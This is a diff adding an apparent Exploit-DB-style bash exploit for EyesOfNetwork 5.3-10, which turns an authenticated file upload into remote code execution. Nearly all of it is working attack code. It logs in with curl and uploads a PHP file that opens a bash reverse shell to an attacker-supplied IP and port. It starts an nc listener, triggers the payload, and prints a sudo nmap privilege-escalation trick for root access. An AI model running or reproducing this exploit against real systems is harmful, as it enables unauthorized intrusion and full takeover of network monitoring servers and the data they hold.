@@ -1,0 +1,132 @@
+# Exploit Title: EyesOfNetwork 5.3 - File Upload Remote Code Execution
+# Date: 10/01/2021
+# Exploit Author: Ariane.Blow
+# Vendor Homepage: https://www.eyesofnetwork.com/en
+# Software Link: http://download.eyesofnetwork.com/EyesOfNetwork-5.3-x86_64-bin.iso
+# Version: 5.3-10 (12/9/2020-lastest)
+
+#!/bin/bash
+
+# (/!\) You may have change this string : "user_id=1; user_limitation=0; group_id=1" if you are not the admin user in the admin group, you find this in the cookies params /!\
+
+###############################################
+#              (Authentified)                 #
+#         Abritraty file upload               #
+#  It whase a Challenge to do that in BASH    #
+#    But the exploit's working fine !         #
+#               ...........                   #
+# Exploit is working with the actual version  #
+#         Scripted on 01/10/2021              #
+#              By Ariane.Blow                 #
+#           https://ariane.agency/            #
+###############################################
+banner()
+{
+clear
+echo "                 ,*-."
+echo '                 |  |'
+echo '             ,.  |  |'
+echo '             | |_|  | ,.'
+echo '             `---.  |_| |'
+echo '                 |  .--`'
+echo "                 |  |"
+echo "                 |  |"
+echo ""Ω
+echo " ! DO NOT USE IF YOU DONT HAVE PERSMISSION !"
+echo ""
+echo "         EyesOfNetwork 5.3-10"
+echo ""
+echo "             RedTeam Tool"
+echo ""
+echo "       Input verification desertion"
+echo ""
+echo "       RCE via Arbitrary FileUpload"
+echo ""
+echo ""
+}
+VAR()
+{
+#var
+#Beacause I don't whant to see all the *.sh in my OPT directory ... BashMan Tips xD !
+mkdir /tmp/EON53
+cd /tmp/EON53
+#you can not upload more than 1 file with a same URL and same filename, i just add a random char at the end of URL and in the filename
+export random=$(cat /dev/urandom | tr -dc 'bcdfghjklmnpqrstvwxz' | head -c 9)
+export filename=shell$random.xml.php
+echo "EyesOfNetwork IP :"
+read eonIP
+echo "HackerIP (used to start the listener) :"
+read hackerIP
+echo "Hacker PORT (used to start the listener):"
+read PORT
+echo "Username (default = admin) :"
+read username
+echo "password :"
+read password
+}
+#Getting the session_id
+GetSessionID()
+{
+echo "getting sessionID ... "    
+echo "curl -i -s -k -X $'POST'     -H $'Host: $eonIP' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://$eonIP/login.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 20' -H $'Origin: https://$eonIP' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1'     --data-binary $'login=$username&mdp=$password'     $'https://$eonIP/login.php' | grep session | cut -d ';' -f 1 | cut -d '=' -f 2" >> GetSession.sh
+chmod +x GetSession.sh
+sessionID=$(./GetSession.sh)
+echo "sessionID acquired : $sessionID"
+sleep 3
+echo 
+}
+#start listener
+start_listen()
+{
+printf "\e[31;1m When the Reverse-Shell is etablished, you can PrivEsc with :\e[0m \n"
+echo "echo 'os.execute(\"/bin/sh\")' > /tmp/nmap.script"
+echo "sudo nmap --script=/tmp/nmap.script"
+printf "\e[31;1m ... I Know ... \e[0m \n"
+echo "gnome-terminal -e 'nc -lnvp $PORT'" >> listen.sh
+chmod +x listen.sh
+./listen.sh
+}
+#POST payload
+Payload()
+{
+echo "Sending PostRequest ..."
+echo "curl -i -s -k -X $'POST' \
+    -H $'Host: $eonIP' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Type: multipart/form-data; boundary=---------------------------123135855827554554412483984802' -H $'Content-Length: 1565' -H $'Origin: https://$eonIP' -H $'Connection: close' -H $'Referer: https://$eonIP/module/admin_itsm/modification_itsm.php' -H $'Cookie: session_id=$sessionID; user_name=$username; user_id=1; user_limitation=0; group_id=1' \
+    -b $'session_id=$sessionID; user_name=$username; user_id=1; user_limitation=0; group_id=1' \
+    --data-binary $'-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_url_id\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_url\"\x0d\x0a\x0d\x0ahttp://HackMe.ImFamous$random\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"fileName\"; filename=\"$filename\"\x0d\x0aContent-Type: text/xml\x0d\x0a\x0a<?php\x0d\x0aexec(\"/bin/bash -c \'bash -i > /dev/tcp/$hackerIP/$PORT 0>&1\'\");\x0a\x0a\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"input_file_name\"\x0d\x0a\x0d\x0ashell.xml\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_type_request\"\x0d\x0a\x0d\x0aget\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_header[]\"\x0d\x0a\x0d\x0aaz\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_var[0][var_name]\"\x0d\x0a\x0d\x0aaz\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_var[0][champ_ged_id]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_parent\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"itsm_return_champ\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------123135855827554554412483984802\x0d\x0aContent-Disposition: form-data; name=\"action\"\x0d\x0a\x0d\x0aadd_external_itsm\x0d\x0a-----------------------------123135855827554554412483984802--\x0d\x0a' \
+    $'https://$eonIP/module/admin_itsm/ajax.php' | grep success" >> req.sh
+chmod +x req.sh
+./req.sh
+}
+#Get request on PHP exploit
+Req_payload()
+{
+echo "Get request on the PHP payload ..."
+echo "curl -i -s -k -X $'GET' \
+    -H $'Host: $eonIP' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: session_id=$sessionID; user_name=$username; user_id=1; user_limitation=0; group_id=1' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
+    -b $'session_id=$sessionID; user_name=$username; user_id=1; user_limitation=0; group_id=1' \
+    $'https://$eonIP/module/admin_itsm/uploaded_file/$filename'" >> reqGET.sh
+
+chmod +x reqGET.sh
+./reqGET.sh
+}
+#Clearing
+Clear_cache()
+{
+echo "clearing cache"
+rm listen.sh
+rm req.sh
+rm reqGET.sh
+rm GetSession.sh
+cd ..
+rmdir EON53
+}
+
+#MAIN
+banner
+VAR
+GetSessionID
+start_listen
+Payload
+Req_payload
+Clear_cache
